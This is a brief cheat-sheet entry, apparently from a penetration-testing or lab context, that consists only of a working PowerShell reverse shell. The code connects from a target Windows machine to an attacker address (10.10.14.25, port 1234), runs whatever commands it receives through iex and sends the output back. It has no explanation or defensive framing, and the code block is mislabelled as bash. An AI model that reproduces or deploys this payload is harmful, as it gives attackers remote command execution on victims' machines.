Windows reverse shell connection from target to attacker 

```bash
$client=New-Object System.Net.Sockets.TCPClient("10.10.14.25",1234);
$stream=$client.GetStream();
[byte[]]$bytes=0..65535|%{0};
while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){;
$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback=(iex $data|Write-Output|Out-String);
$sendback2=$sendback+"#";
$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close();
```
